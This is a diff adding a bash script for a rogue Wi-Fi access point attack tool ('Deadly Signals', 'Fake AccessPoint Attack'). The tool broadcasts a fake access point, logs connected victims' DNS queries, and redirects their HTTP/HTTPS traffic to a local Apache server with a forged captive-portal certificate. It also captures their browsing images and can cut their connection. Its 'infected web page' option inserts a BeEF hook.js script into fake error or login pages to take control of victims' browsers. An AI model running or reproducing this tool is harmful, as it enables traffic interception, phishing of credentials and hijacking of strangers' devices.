@@ -1,0 +1,703 @@
+#!/bin/bash
+
+## Colors ##
+Black='\033[0;30m'        # Black
+Red='\033[0;31m'          # Red
+Green='\033[0;32m'        # Green
+Yellow='\033[0;33m'       # Yellow
+Blue='\033[0;34m'         # Blue
+Purple='\033[0;35m'       # Purple
+Cyan='\033[0;36m'         # Cyan
+White='\033[0;37m'        # White
+Color_Off='\033[0m'       # Text Reset
+# Bold
+BBlack='\033[1;30m'       # Black
+BRed='\033[1;31m'         # Red
+BGreen='\033[1;32m'       # Green
+BYellow='\033[1;33m'      # Yellow
+BBlue='\033[1;34m'        # Blue
+BPurple='\033[1;35m'      # Purple
+BCyan='\033[1;36m'        # Cyan
+BWhite='\033[1;37m'       # White
+
+#source devices
+function banner {
+	echo -e """
+		        ${Green}.-  _           _  -.
+ 		       /   /             \   )
+		      (   (  (. (${White}-o-${Green}) .)  )   )
+                       \   \_ .  ${White}-+-${Green}  . _/   /
+                        .-       ${White}-+-${Green}       -.
+${Red}    ___               _ _        ${White}-+-${Yellow}  __ _                   _
+${Red}   /   \___  __ _  __| | |_   _  ${White}_|_${Yellow} / _(_) __ _ _ __   __ _| |___
+${Red}  / /\ / _ \/ _  |/ _  | | | | | ${White}|/|${Yellow} \ \| |/ _  |  _ \ / _  | / __|
+${Red} / /_//  __/ (_| | (_| | | |_| | ${White}|\|${Yellow} _\ \ | (_| | | | | (_| | \__ |
+${Red}/___ / \___|\__ _|\__ _|_|\__  | ${White}|/|${Yellow} \__/_|\__  |_| |_|\__ _|_|___/
+${Red}                          |___/           ${Yellow} |___/
+${Yellow}   Fake AccessPoint Attack ${Blue}Version 2.2 Beta ${White}Created By${Red}:${Yellow}0V3rK!113R
+
+	${Color_Off}"""
+}
+
+function header {
+
+	printf "\n${Purple}[${Red}Deadly${Purple}((${Yellow}-${Blue}@${Yellow}-${Purple}))${Red}Signals${Purple}]${White}:${Color_Off}"
+}
+
+function normal_interrupt {
+
+	echo -e "\n[${Red}x$Color_Off]Shutting down"
+	exit $?
+}
+
+function hard_interrupt {
+
+	echo -e "\n[${Red}x$Color_Off]Kill monitor mode"
+	STOP_MONITOR=$(airmon-ng stop $MON_INTERFACE > /dev/null)
+
+	echo -e "[${Red}x$Color_Off]turnning off all interfaces"
+	BROADCAST_INTERFACE_DOWN=$(ifconfig $BROADCAST_INTERFACE down > /dev/null)
+	ONLINE_INTERFACE_DOWN=$(ifconfig $ONLINE_INTERFACE down > /dev/null)
+
+	echo -e "[${Red}x${Color_Off}]Turnoff the broadcasting AP"
+	#KILL_SIGNAL=$(ip addr del 10.0.0.1/24 brd + dev ap0)
+	#DELETE_INTERFACE=$(ip link delete ap0 type dummy)
+	#DELETE_MOD=$(rmmod dummy)
+
+	echo -e "[${Red}x$Color_Off]Kill fuser!"
+	KILL_FUSER=$(fuser -k 53/tcp 2> /dev/null)
+
+	echo -e "[${Red}x$Color_Off]Restarting the network"
+	ALL_INTERFACE_RESET=$(systemctl restart network-manager > /dev/null)
+
+	echo -e "[${Red}x$Color_Off]Turnoff network redirection"
+	REDIRECTION_OFF=$(echo 0 > /proc/sys/net/ipv4/ip_forward)
+
+	RULES_KILL=$(iptables -L FORWARD | grep REJECT | grep tcp > /dev/null)
+	if [ $? = 0 ]
+		then
+		echo -e "[${Red}x${Color_Off}]Flushing ip rules"
+		FLUSH_RULE_1=$(iptables -D FORWARD -p tcp -j REJECT)
+		FLUSH_RULE_2=$(iptables -D FORWARD -p icmp -j REJECT)
+	fi
+	echo -e "[${Red}x${Color_Off}]Disable the server"
+	if [ -d /etc/apache2/ssl ]
+		then rm -r /etc/apache2/ssl
+	fi
+	a2dismod ssl > /dev/null
+	/etc/init.d/apache2 stop
+
+	echo -e "[${Red}x${Color_Off}]Clearing the files"
+	WIPE_DNSMASQ=$(echo 0 > /etc/dnsmasq.conf)
+	rm .* 2> /dev/null
+
+    
+    echo -e "[${Blue}?${Color_Off}]Do you want to flush all iptables?(Y/N) ${Green}[Recommended]${Color_Off}"
+	header
+	read flushing_tables
+	if [ $flushing_tables = "y" ] || [ $flushing_tables = "Y" ]
+		then echo -e "[${Green}+${Color_Off}]Flushing iptables.."
+		iptables -t nat -F
+		iptables -F
+	elif [ $flushing_tables = "n" ] || [ $flushing_tables = "N" ]
+		then echo -e "${Green}OK!${Color_Off}"
+
+	else
+		echo -e "[${Green}+${Color_Off}]Flushing iptables.."
+		iptables -t nat -F
+		iptables -F
+	fi
+	echo -e "[${Red}x${Color_Off}]Exit!"
+
+	if [ $? != 0 ]
+		then echo -e "${Red}[X]Critical:Something goes wrong while stopping the broadcasted wifi!!"
+		exit 1
+
+	else
+		exit 0
+	fi
+
+}
+
+#===============================CHECKING AREA====================================#
+
+function check_root {
+
+	if [ $USER != root ]
+		then echo -e "$Red[x]You don't have root user privilages"
+		exit 1
+	else
+		clear
+	fi
+}
+
+function check_files {
+	if [ -f /usr/share/man/man8/dnsmasq.8.gz ]
+		then echo -e "[${Green}+${Color_Off}]dnsmasq Installed"
+		sleep 0.1
+	else
+		echo -e "[${Red}x${Color_Off}]dnsmasq not Installed!"
+		echo -e "[${Yellow}!${Color_Off}]use ./install to install this tool"
+		exit 1
+	fi
+
+	if [ -f /usr/sbin/airmon-ng ]
+		then echo -e "[${Green}+${Color_Off}]airmon-ng Installed"
+		sleep 0.1
+	else
+		echo -e "[${Red}x${Color_Off}]airmon-ng not Installed"
+		echo -e "[${Yellow}!${Color_Off}]use ./install to install this tool"
+		exit 1
+	fi
+
+	if [ -f /usr/sbin/airbase-ng ]
+		then echo -e "[${Green}+${Color_Off}]airbase-ng Installed"
+		sleep 0.1
+	else
+		echo -e "[${Red}x${Color_Off}]airbase-ng not Installed"
+		echo -e "[${Yellow}!${Color_Off}]use ./install to install this tool"
+		exit 1
+	fi
+
+	if [ -d /usr/share/iptables/ ]
+		then echo -e "[${Green}+${Color_Off}]iptables Installed"
+		sleep 0.5
+	else
+		echo -e "[${Red}x${Color_Off}]iptables not Installed"
+		echo -e "[${Yellow}!${Color_Off}]use ./install to install this tool"
+		exit 1
+	fi
+	echo -e "[${Yellow}+${Color_Off}]Starting"
+	sleep 1
+	clear
+}
+
+function check_system {
+	banner
+	echo -e "[${Blue}*${Color_Off}]Check Comptaiblity.."
+	if [ -d /etc/apt/ ]
+		then SYSTEM_DISTRO="Debian"
+	elif [ -d /etc/pacman.d/ ]
+		then SYSTEM_DISTRO="Arch"
+	else
+		echo -e "[${Red}x${Color_Off}]This distro is not supported yet!"
+		echo -e "[${Yellow}!${Color_Off}]you need to run it on Debian or Arch distro"
+		exit 1
+	fi
+}
+
+function check_nic_support {
+	echo -e "[${Blue}*${Color_Off}]Check NIC Support AP"
+	NIC_SUPPORT=$(iw list | grep "Device supports AP scan")
+	if [ $? != 0 ]
+		then echo -e "[${Red}x${Color_Off}]Your Wireless card doesn't have capability to act as AccessPoint"
+		exit 1
+	fi
+}
+
+function check_nl80211 {
+
+	echo -e "[${BBlue}*${Color_Off}]Check NL80211"
+	NL_SUPPORT=$(lsmod | grep ath)
+	if [ $? != 0 ]
+		then echo -e "[${Red}x${Color_Off}]Your Wireless card doesn't capability to act as AccessPoint"
+		exit 1
+	fi
+}
+
+function check_firewall {
+	echo -e "[${BBlue}*${Color_Off}]check_firewall"
+	UFW=$(iptables --list-rules | grep ufw)
+	if [ $? = 0 ]
+		then echo -e "[${Yellow}!${Color_Off}]Looks like your firewall is active"
+		echo -e "${Green}\nFirewall may interfere with this tool and prevent the devices from make connection to your AP"
+		echo -e "${Green}It's very recommended to disable your firewall before using this tool"
+		echo -e "${Cyan}Disable your firewall then restart your machine and start to use the tool${Color_Off}"
+		printf "\nPress Enter To Continue.."
+		read pass
+	fi
+}
+
+#======================================================================================================#
+
+function Informations {
+
+	echo -e "[$Blue?$Color_Off]Enter AccessPoint name "
+	header
+	read APNAME
+	if [ -z $APNAME ]
+		then echo -e "${Red}[x]Cannot be empty!${Color_Off}"
+		exit 1
+	fi
+	echo $APNAME > .signalname
+	echo -e "\n[$Blue?$Color_Off]Choose an option: ${Green}[default = 1]${Color_Off}\n"
+	echo -e "[${Yellow}1${Color_Off}]Visible"
+	echo -e "[${Yellow}2${Color_Off}]Hidden ${Red}[Not working yet!]${Color_Off}"
+	## Add password Later ##
+	header
+	read APOPTIONS
+
+	DUAL_NIC=$(ip -o -4 route show to default | awk '{print $5}' | wc -l)
+	NAME_NIC=$(ip -o -4 route show to default | awk '{print $5}')
+
+
+	## TRY to view them in colorful way and choose it with number ##
+	## try to check if interface is in the list ##
+
+	if [ $DUAL_NIC -ge 2 ]
+		then ip -o -4 route show to default | awk '{print $5}' > .upinterfaces
+		NIC_1=$(sed '1q;d' .upinterfaces)
+		NIC_2=$(sed '2q;d' .upinterfaces)
+		NIC_3=$(sed '3q;d' .upinterfaces)
+		echo -e "${Red}[${Yellow}*${Red}]${Color_Off} $NIC_1"
+		echo -e "${Red}[${Yellow}*${Red}]${Color_Off} $NIC_2"
+		echo -e "${Red}[${Yellow}*${Red}]${Color_Off} $NIC_3  "
+		## have to check if input correct ##
+
+		echo -e "\n[${Blue}?${Color_Off}]Which interface you will use to broadcast your wifi signal?"
+		header
+		read BROADCAST_INTERFACE
+		echo -e "\n[${Blue}?${Color_Off}]Which interface you will use to provide the internet connection?"
+		header
+		read ONLINE_INTERFACE
+
+		## Check if the online interface is online ##
+
+		ONLINE_INTERFACE_CHECK=$(more /sys/class/net/$ONLINE_INTERFACE/operstate)
+		if [ $ONLINE_INTERFACE_CHECK != up ]
+			then echo "\n[${Red}x${Color_Off}]Make sure that the interface that will provide internet connection is online!"
+			exit 1
+		fi
+
+	else
+		echo -e "[${Red}x${Color_Off}]Error:only one network interface detected!"
+		echo -e "[${Yellow}!${Color_Off}]You should have at least 2 network cards to broadcast the signal and provide the internet connection"
+		echo -e "[${Yellow}!${Color_Off}]Make sure that the both network interfaces are connected to the internet to make it easy to detect them"
+		exit 1
+	fi
+
+	if [ -d /sys/class/net/$BROADCAST_INTERFACE/device/driver/module/drivers/ ]
+		then NETWORK_CARD=$(ls /sys/class/net/$BROADCAST_INTERFACE/device/driver/module/drivers/)
+
+	else
+		echo -e "[${Red}x${Color_Off}]Something wrong with getting interface or your Wireless card!"
+		exit 1
+	fi
+
+
+	echo -e "\n[$Green+$Color_Off]AccessPoint name   	  : $APNAME"
+	echo -e "[$Green+$Color_Off]Wireless interface     : $BROADCAST_INTERFACE"
+	echo -e "[$Green+$Color_Off]Wireless Network Card  : $NETWORK_CARD"
+	echo -e "[${Green}+$Color_Off]System Distrbution     : $SYSTEM_DISTRO"
+
+}
+
+function configure_dnsmasq {
+
+	echo "log-facility=/var/log/dnsmasq.log" > /etc/dnsmasq.conf
+	echo "interface=at0" >> /etc/dnsmasq.conf
+	echo "dhcp-range=10.0.0.10,10.0.0.250,12h" >> /etc/dnsmasq.conf
+	echo "dhcp-option=3,10.0.0.1" >> /etc/dnsmasq.conf
+	echo "dhcp-option=6,10.0.0.1" >> /etc/dnsmasq.conf
+	echo "server=8.8.8.8" >> /etc/dnsmasq.conf
+	echo "log-queries" >> /etc/dnsmasq.conf
+	echo "log-dhcp" >> /etc/dnsmasq.conf
+	## START ##
+	xterm -geometry 97x26-0+0 -fg "#00FF11" -bg "#000000" -title DNSRequests -e dnsmasq -C /etc/dnsmasq.conf -d &
+
+}
+
+function monitor_mode {
+
+	START_MONITOR=$(airmon-ng start $BROADCAST_INTERFACE > /dev/null)
+
+	## FIXME: Can't check if the interface is support the monitor mode or not [always == 0] ##
+	if [ $? != 0 ]
+		then
+			echo -e "[$Red x $Color_Off]Error:Can't go to monitor mode!"
+			echo -e "[$Yellow!$Color_Off]Make sure that your Wireless network card support monitor mode!"
+			exit 1
+	fi
+}
+
+function broadcast_ap {
+
+	MON_INTERFACE="$(ls /sys/class/net/ | grep mon)"
+
+	if [ $? != 0 ]
+		then
+			echo -e "[$Red x $Color_Off]Error:Can't go to monitor mode!"
+			echo -e "[$Yellow!$Color_Off]Make sure that your Wireless network card support monitor mode!"
+			exit 1
+	fi
+
+	if [ $APOPTIONS = "1" ] || [ -z $APOPTIONS ]
+		then xterm -geometry 97x14-0-0 -fg "#FF4040" -bg "#000000" -title BroadcastingON -e airbase-ng -e "$APNAME" -c 6 $MON_INTERFACE &
+	## FIXME Can't hide the AP ##
+	elif [ $APOPTIONS = "2" ]
+		then xterm -geometry 97x14-0-0 -fg "#FF4040" -bg "#000000" -title BroadcastingON -e airbase-ng -e "$APNAME" -c 6 -X $MON_INTERFACE &
+	else
+		xterm -geometry 97x14-0-0 -fg "#FF4040" -bg "#000000" -title BroadcastingON -e airbase-ng -e "$APNAME" -c 6 $MON_INTERFACE &
+	fi
+}
+
+function set_ips {
+
+	IP_NETWORK="10.0.0.0"
+	IP_START="10.0.0.10"
+	IP_END="10.0.0.250"
+	NETMASK="255.255.255.0"
+	GATEWAY="10.0.0.1"
+
+	ifconfig at0 $GATEWAY/24 up
+	if [ $? != 0 ]
+		then echo -e "[${Red}x${Color_Off}]Can't set at0 interface!"
+	fi
+	route add -net $IP_NETWORK netmask $NETMASK gw $GATEWAY
+	echo 1 > /proc/sys/net/ipv4/ip_forward
+	iptables -P FORWARD ACCEPT
+	iptables -t nat -A POSTROUTING -o $ONLINE_INTERFACE -j MASQUERADE
+}
+#===================================>ATTACK LIST
+function redirecting_start {
+	HOST_IP=($(ip route get 8.8.8.8 | awk '{print $NF; exit }'))
+	echo -e "[${Blue}*${Color_Off}]Redirecting http requests"
+	iptables --append FORWARD --in-interface at0 -j ACCEPT
+	iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j DNAT --to-destination $HOST_IP:80
+	echo -e "[${Blue}*${Color_Off}]Redirecting https requests"
+	iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j DNAT --to-destination $HOST_IP:443
+	
+	CHECK_SSL_REDIRECTING=$(iptables --list-rules | grep 443)
+	if [ $? != 0 ]
+		then iptables -A INPUT -p tcp --source-port 443 -j ACCEPT
+		iptables -A OUTPUT -p tcp --destination-port 443 -j ACCEPT
+	fi
+	
+	CHECK_MASQUERADE=$(iptables -t nat --list-rules | grep MASQUERADE)
+	if [ $? != 0 ] 
+		then iptables -t nat -A POSTROUTING -j MASQUERADE
+	fi
+	
+	a2enmod ssl > /dev/null
+	if [ -d /etc/apache2/ssl ]
+		then rm -r /etc/apache2/ssl/*
+		openssl req -subj '/CN=captive.router.lan/O=CaptivePortal/OU=Networking/C=US' -new -newkey rsa:2048 -days 365 -nodes -x509 -keyout /etc/apache2/ssl/deadly.signals.key -out /etc/apache2/ssl/deadly.signals.crt 2> /dev/null
+		chmod 700 /etc/apache2/ssl/*
+	else
+		mkdir /etc/apache2/ssl
+		openssl req -subj '/CN=captive.router.lan/O=CaptivePortal/OU=Networking/C=US' -new -newkey rsa:2048 -days 365 -nodes -x509 -keyout /etc/apache2/ssl/deadly.signals.key -out /etc/apache2/ssl/deadly.signals.crt 2> /dev/null
+		chmod 700 /etc/apache2/ssl/*
+	fi
+	
+	APACHE_CHECK=($(sudo /etc/init.d/apache2 status 2> /dev/null))
+
+	if [ $? != 0 ]
+
+		then echo -e "[${Blue}?${Color_Off}]Start the Apache server? (Y/N)"
+		header
+		read APACHE_START
+		if [ $APACHE_START = "y" ] || [ $APACHE_START = "Y" ]|| [ -z $APACHE_START ]
+			then /etc/init.d/apache2 restart
+		else
+			echo -e "${Green}OK${Color_Off}!"
+		fi
+	else
+		echo -e "[${Yellow}!${Color_Off}]Apache server is enabled"
+	fi
+
+	if [ $? != 0 ]
+		then echo -e "[${Red}x${Color_Off}]Faild to start apache server!"
+		echo -e "[${Red}!${Color_Off}]Fall back.."
+		iptables -D FORWARD --in-interface at0 -j ACCEPT
+		iptables -t nat -D PREROUTING -p tcp --destination-port 80 -j DNAT --to-destination $HOST_IP:80
+		iptables -t nat -D PREROUTING -p tcp --destination-port 443 -j DNAT --to-destination $HOST_IP:443
+		iptables -D INPUT -p tcp --source-port 443 -j ACCEPT
+		iptables -D OUTPUT -p tcp --destination-port 443 -j ACCEPT
+		iptables -t nat -D POSTROUTING -j MASQUERADE
+		a2dismod ssl > /dev/null
+		rm -r /etc/apache2/ssl
+	fi
+	echo -e "[${Green}+${Color_Off}]Process done successfully"
+	echo -e "[${Yellow}!${Color_Off}]place your index.html file to /var/www/html"
+}
+
+function redirecting_stop {
+	HOST_IP=($(ip route get 8.8.8.8 | awk '{print $NF; exit }'))
+	echo -e "[${Red}*${Color_Off}]Reset the redirection rules.."
+	iptables -D FORWARD --in-interface at0 -j ACCEPT 2> /dev/null
+	iptables -t nat -D PREROUTING -p tcp --destination-port 80 -j DNAT --to-destination $HOST_IP:80 2> /dev/null
+	iptables -t nat -D PREROUTING -p tcp --destination-port 443 -j DNAT --to-destination $HOST_IP:443 2> /dev/null
+	iptables -D INPUT -p tcp --source-port 443 -j ACCEPT 2> /dev/null
+	iptables -D OUTPUT -p tcp --destination-port 443 -j ACCEPT 2> /dev/null
+	iptables -t nat -D POSTROUTING -j MASQUERADE 2> /dev/null
+	a2dismod ssl > /dev/null
+	rm -r /etc/apache2/ssl/
+	
+	echo -e "[${Red}?${Color_Off}]Stop the Apache server? (Y/N)"
+	header
+	read APACHE_STOP
+	if [ $APACHE_STOP = "y" ] || [ $APACHE_STOP = "Y" ] || [ -z $APACHE_STOP ]
+		then /etc/init.d/apache2 stop
+	else
+		echo -e "${Red}OK${Color_Off}!"
+	fi
+}
+
+function infected_index {
+	echo -e "[${Blue}*${Color_Off}]${Green}This will create an index web page with malicious code to control the target \n${Cyan}it's highly recommended to use Redirecting websites option to redirect that index file to the target\n${Color_Off}"
+	echo -e "[${Yellow}1${Color_Off}]Create default page"
+	echo -e "[${Yellow}2${Color_Off}]Create custom page"
+	header
+	read INDEX_CREATION
+
+	if [ $INDEX_CREATION = 1 ] || [ -z $INDEX_CREATION ]
+		then 
+		echo -e "\n[${Yellow}1${Color_Off}]Create fake error page"
+		echo -e "[${Yellow}2${Color_Off}]Create fake login page"
+		header
+		read INDEX_TYPE
+
+		if [ $INDEX_TYPE = 1 ] || [ -z $INDEX_TYPE ]
+			then 
+			more files/error_page/index.html | grep "<script src=\"http://$HOST_IP:3000/hook.js\"></script>" > /dev/null
+			if [ $? != 0 ]
+				then sed -i "6i <script src=\"http://$HOST_IP:3000/hook.js\"></script>" files/error_page/index.html
+			else
+				sed -i "6d" files/error_page/index.html
+				sed -i "6i <script src=\"http://$HOST_IP:3000/hook.js\"></script>" files/error_page/index.html
+			fi
+
+			cp files/error_page/index.html /var/www/html/
+			cp files/error_page/.error.png /var/www/html/
+			echo -e "[${Green}+${Color_Off}]index files has been created successfully"
+			echo -e "[${Yellow}!${Color_Off}]You can edit index file at ${Green}/var/www/html/index.html ${Color_Off}"
+			
+			echo -e "[${Blue}?${Color_Off}]Start beef-xss UI panel? (Y/N)"
+			header
+			read BEEF_STARTING
+
+			if [ $BEEF_STARTING = y ] || [ $BEEF_STARTING = Y ] || [ -z $BEEF_STARTING ]
+				then echo -e "[${Green}+${Color_Off}]Starting beef UI.."
+				beef-xss > /dev/null &
+				sleep 12
+			else
+				echo -e "${Red}OK${Color_Off}!"					
+
+			fi
+		
+		elif [ $INDEX_TYPE = 2 ]
+			then 
+			more files/error_page/index.html | grep "<script src=\"http://$HOST_IP:3000/hook.js\"></script>" > /dev/null
+			if [ $? != 0 ]
+				then
+				sed -i "134i <script src=\"http://$HOST_IP:3000/hook.js\"></script>" files/login_page/index.html
+			else
+				sed -i "134d" files/login_page/index.html
+				sed -i "134i <script src=\"http://$HOST_IP:3000/hook.js\"></script>" files/login_page/index.html 
+
+			fi
+			
+			cp files/login_page/index.html /var/www/html
+			echo -e "[${Green}+${Color_Off}]index files has been created successfully"
+			echo -e "[${Yellow}!${Color_Off}]You can edit index file at ${Green}/var/www/html/index.html ${Color_Off}"
+			
+			echo -e "[${Blue}?${Color_Off}]Start beef-xss panel? (Y/N)"
+			header
+			read BEEF_STARTING
+
+			if [ $BEEF_STARTING = y ] || [ $BEEF_STARTING = Y ] || [ -z $BEEF_STARTING ]
+				then echo -e "[${Green}+${Color_Off}]Starting beef-xss.."
+				beef-xss > /dev/null &
+				sleep 8
+			else
+				echo -e "${Red}OK${Color_Off}!"					
+
+			fi
+				
+		fi
+
+	elif [ $INDEX_CREATION = 2 ]
+		then echo -e "[${Blue}*${Color_Off}]Create your index.html and place this code inside it\n${Yellow}<script src=\"http://$HOST_IP:3000/hook.js\"></script>\n${Color_Off}then place the file in ${Green}/var/www/html/${Color_Off}\n"
+		echo -e "[${Blue}?${Color_Off}]Start beef-xss panel? (Y/N)"
+		header
+		read BEEF_STARTING
+		if [ $BEEF_STARTING = y ] || [ $BEEF_STARTING = Y ] || [ -z $BEEF_STARTING ]
+				then echo -e "[${Green}+${Color_Off}]Starting beef-xss.."
+				beef-xss > /dev/null &
+				sleep 8
+			else
+				echo -e "${Red}OK${Color_Off}!"					
+		fi
+	fi
+
+}
+
+function attack_options {
+	HOST_IP=($(ip route get 8.8.8.8 | awk '{print $NF; exit }'))
+	while [[ true ]]; do
+		clear
+		banner
+		RULES_EXIST=$(iptables -L FORWARD | grep REJECT | grep tcp  > /dev/null)
+		if [ $? = 0 ]
+			then echo -e "\n${Red}●${Color_Off} Connection Status - Offline\n"
+		else
+			echo -e "\n${Green}●${Color_Off} Connection Status - Online\n"
+		fi
+		echo -e "\n${Yellow}[${Red}1${Yellow}]${Color_Off}Get Browsing Images"
+		echo -e "${Yellow}[${Red}2${Yellow}]${Color_Off}Make login required ${Red}[Still under developing]"
+		echo -e "${Yellow}[${Red}3${Yellow}]${Color_Off}Redirecting websites ${Green}Start${Color_Off}"
+		echo -e "${Yellow}[${Red}4${Yellow}]${Color_Off}Redirecting websites ${Red}Stop${Color_Off}"
+		echo -e "${Yellow}[${Red}5${Yellow}]${Color_Off}Offline Connection"
+		echo -e "${Yellow}[${Red}6${Yellow}]${Color_Off}Online Connection"
+		echo -e "${Yellow}[${Red}7${Yellow}]${Color_Off}Show the connected devices"
+		echo -e "${Yellow}[${Red}8${Yellow}]${Color_Off}Create infected web page"
+		echo -e "\n[${Yellow}!${Color_Off}]${Red}Press Ctrl+C to kill the broadcast of AP${Color_Off}"
+		header
+		read ATTACKOPTION
+		if [ $ATTACKOPTION = 1 ]
+	    	then echo -e "\n[${Green}+${Color_Off}]Get images.."
+	    	driftnet -i at0 2> /dev/null &
+			sleep 3
+		
+		elif [ $ATTACKOPTION = 2 ]
+			then echo -e "\n[${Green}+${Color_Off}]Create login page.."
+			##TODO: put your code here ##
+
+		elif [ $ATTACKOPTION = 3 ]
+			then CHECK_SPOOFING=$(iptables --table nat --list-rules | grep $HOST_IP > /dev/null)
+			if [ $? != 0 ]
+				then echo -e "\n[${Green}+${Color_Off}]Redirecting.."
+				redirecting_start
+				sleep 4
+			else
+				echo -e "[${Red}x${Color_Off}]Redirecting already enabled"
+				sleep 4
+			fi
+	
+		elif [ $ATTACKOPTION = 4 ]
+			then CHECK_SPOOFING=$(iptables --table nat --list-rules | grep $HOST_IP > /dev/null)
+			if [ $? = 0 ]
+				then redirecting_stop
+				sleep 4
+			else
+				echo -e "[${Red}x${Color_Off}]Redirecting already disabled"
+				sleep 3
+			fi
+
+		# Connection OFF #
+		elif [ $ATTACKOPTION = 5 ]
+			then RULES_EXIST=$(iptables -L FORWARD | grep REJECT | grep tcp  > /dev/null)
+			if [ $? != 0 ]
+				then echo -e "\n[${Green}+${Color_Off}]Go Offline.."
+				iptables -A FORWARD -p tcp -j REJECT
+				iptables -A FORWARD -p icmp -j REJECT
+			else
+				echo -e "\n[${Red}x${Color_Off}]Connection is already ${Red}OFF${Color_Off}"
+				sleep 3
+			fi
+
+		elif [ $ATTACKOPTION = 6 ]
+			then RULES_EXIST=$(iptables -L FORWARD | grep REJECT | grep tcp  > /dev/null)
+			if [ $? = 0 ]
+				then echo -e "\n[${Green}+${Color_Off}]Go Online.."
+				iptables -D FORWARD -p tcp -j REJECT
+				iptables -D FORWARD -p icmp -j REJECT
+			else
+				echo -e "\n[${Red}x${Color_Off}]Connection is already ${Green}ON${Color_Off}"
+				sleep 3
+
+			fi
+
+		elif [ $ATTACKOPTION = 7 ]
+			then xterm -geometry 71x29+0+200 -bg "#000000" -title ConnectedDevices -e sudo watch -c -n 8 -t bash files/devices &
+
+		elif [ $ATTACKOPTION = 8 ]
+			then infected_index
+
+		else
+			echo -e "[${Red}x${Color_Off}]False Input!"
+			sleep 1
+
+
+		fi
+
+	done
+
+}
+
+
+function main {
+	trap normal_interrupt SIGINT
+	banner
+	check_root
+	check_system
+	sleep 0.1
+	check_nl80211
+	sleep 0.1
+	check_nic_support
+	sleep 0.1
+	check_firewall
+	check_files
+	banner
+	Informations
+
+	echo -e "\n[$Blue?$Color_Off]Start the fake AP? (Y/N) : "
+	header
+	read START_BROADCAST
+
+	while [ -z $START_BROADCAST ]
+		do echo -e "[${Yellow}!${Color_Off}]Type y = 'yes' or n = 'no'\n"
+		echo -e "\n[$Blue?$Color_Off]Start the fake AP? (y,n) : "
+		header
+		read START_BROADCAST
+	done
+
+	trap hard_interrupt SIGINT
+	if [ $START_BROADCAST = y ] || [ $START_BROADCAST = Y ]
+		then
+
+
+		#Monitor Mode
+		echo -e "[$BBlue*$Color_Off]Enable monitor mode"
+		monitor_mode
+		sleep 3
+
+		#Start airbase
+		echo -e "[$BBlue*$Color_Off]Broadcasting the WiFi"
+		broadcast_ap
+		sleep 5
+
+		#Setting IP's
+		echo -e "[$BBlue*$Color_Off]Set IP/Gateway for AP"
+		set_ips
+		sleep 3
+
+		#Configure dnsmasq
+		echo -e "[$BBlue*$Color_Off]Enable dnsmasq"
+		configure_dnsmasq
+
+
+		#Done
+		echo -e "[${Green}+${Color_Off}]Everything is done succesfully"
+		echo -e "\n[${Yellow}!${Color_Off}]${Red}Press Ctrl+C to kill the broadcast of AP${Color_Off}\n"
+		echo -e "[${Yellow}!${Color_Off}]Press ${Green}Enter${Color_Off} to show attacking options"
+		## Make option here! ##
+		header
+		read BROADCAST_PROCESSING
+		if [ -z $BROADCAST_PROCESSING ]
+			then attack_options
+		fi
+		## TODO: the last header have to do some works :) ##
+
+	elif [ $START_BROADCAST = n ] || [ $START_BROADCAST = N ]
+		then
+		echo -e "\n[${Red}x$Color_Off]Shutting down"
+		exit 0
+
+	else
+		return
+	fi
+
+}
+
+main
